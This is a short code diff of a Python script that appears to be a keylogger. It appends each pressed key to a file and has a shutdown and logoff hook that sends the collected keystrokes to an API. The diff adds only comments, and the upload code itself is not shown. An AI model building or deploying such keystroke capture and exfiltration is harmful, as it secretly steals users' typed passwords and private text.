@@ -26,6 +26,8 @@ def onPressKey(key):
         with open(file, "a") as f:
             f.write(f'[{key}]')
 
+
+# Function created to send data to the API.
 def sendDataToAPI():
     lines = ""
     with open(file, 'r') as f:
@@ -38,6 +40,7 @@ def sendDataToAPI():
     return True
 
 # This function will be called before the system shuts down.
+# Even when the user tries to logoff, then also before the user logs off, this will try to send the data to the API.
 def onShutdown():
     print("System is shutting down... Sending data to API.")
     sendDataToAPI()
